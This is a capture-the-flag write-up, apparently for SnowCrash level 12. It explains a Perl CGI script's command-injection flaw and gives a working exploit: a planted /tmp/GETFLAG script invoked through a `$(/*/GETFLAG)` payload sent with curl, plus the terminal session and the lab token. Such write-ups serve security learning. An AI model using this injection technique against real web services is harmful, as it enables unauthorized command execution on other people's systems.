## **level12:**

In this level, I discovered a Perl script that accepts two parameters (`x` and `y`) via a CGI request.

The script executes a shell command using the first parameter (`x`) after converting it to uppercase and filtering out any whitespace.

Script Functionality:

- The `t` function converts the input parameter to uppercase and uses it in an `egrep` command to search for matching lines in the `/tmp/xd` file.
- If a match is found, it returns `1`; otherwise, it returns `0`.
- The `n` function prints `".."` if the result is `1`, and `"."` otherwise.

Vulnerability:

I exploited this by creating a shell script named `GETFLAG` in the `/tmp` directory. This script runs the `getflag` command and redirects its output to `/tmp/flag`.

Because the input is transformed to uppercase, directly using a command like `$(getflag)` wouldn’t work, as it would be converted to `$(GETFLAG)`, which doesn’t exist by default. However, by creating the `GETFLAG` script, I can bypass this limitation and retrieve the flag.


```
echo '#!/bin/sh' > /tmp/GETFLAG
echo 'getflag > /tmp/flag' >> /tmp/GETFLAG
```

make the script executable:

```
chmod +x /tmp/GETFLAG
```

Execute the exploit using backticks for command injection:

```
curl 'localhost:4646/?x=$(/*/GETFLAG)'
```

Retrieve the flag:

```
cat /tmp/flag
```

This is the password for the next level (Level13).

```
level12@SnowCrash:~$ echo '#!/bin/sh' > /tmp/GETFLAG
level12@SnowCrash:~$ echo 'getflag > /tmp/flag' >> /tmp/GETFLAG
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
level12@SnowCrash:~$ curl 'localhost:4646/?x=$(/*/GETFLAG)'
..level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$
```